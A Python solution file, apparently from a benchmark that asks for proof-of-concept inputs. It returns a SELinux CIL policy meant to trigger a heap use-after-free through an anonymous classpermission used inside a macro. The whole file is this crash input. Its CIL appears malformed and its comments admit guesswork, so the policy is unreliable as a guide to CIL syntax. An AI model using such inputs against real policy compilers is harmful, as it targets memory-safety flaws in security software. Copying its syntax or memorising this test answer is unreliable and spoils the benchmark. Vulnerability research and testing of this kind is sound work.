import os
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct the CIL policy that triggers the heap use-after-free
        # Based on the vulnerability description: anonymous classpermission passed
        # into a macro that uses a classpermissionset rule
        poc = b"""(
    ; Define a class
    (class file)
    
    ; Define some permissions
    (perm read)
    (perm write)
    
    ; Define a macro that uses classpermissionset with an anonymous classpermission
    (macro test_macro ()
        (classpermissionset my_permset
            (classpermission 
                (class file)
                (perm read)
            )
        )
        (allow process my_permset (all))
    )
    
    ; Call the macro multiple times to trigger the issue
    (call test_macro)
    
    ; Create another anonymous classpermission in a different context
    (classpermissionset another_permset
        (classpermission
            (class file)
            (perm write)
        )
    )
    
    ; Use it in an allow rule
    (allow process another_permset (all))
    
    ; Define process type
    (type process)
    
    ; Define some additional types to make the policy valid
    (type file_type)
    (typeattribute domain)
    (role object_r)
    (roletype object_r domain)
    (user user_u)
    (userrole user_u object_r)
    (sid kernel)
    (sidorder kernel kernel)
    (sensitivity s0)
    (category c0)
    (level s0 (c0))
    (categoryorder c0)
    (sensitivityorder s0)
    
    ; More macro calls to increase chance of triggering
    (call test_macro)
    (call test_macro)
)"""
        
        return poc
